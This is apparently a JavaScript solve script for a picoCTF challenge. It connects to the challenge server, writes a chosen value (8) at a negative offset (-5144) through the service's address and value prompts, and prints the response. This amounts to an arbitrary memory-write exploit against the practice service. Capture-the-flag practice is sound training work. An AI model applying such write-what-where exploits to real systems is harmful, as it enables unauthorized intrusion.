import convo from "../convo.js";
import nc from "../nc.js";
import "../util.js";

const OFFSET = -5144;
const VALUE = 8;

const cat = new nc("nc mercury.picoctf.net 17612");

await cat.open;
// await cat.toggleStdout();
await cat.readUntil("Address: ");
await cat.write(OFFSET + "\n");
await cat.readUntil("Value: ");
await cat.write(convo.raw(VALUE));
await cat.write("\n");
console.log("[!] " + (await cat.readline()).slice(0,-1))
await cat.kill();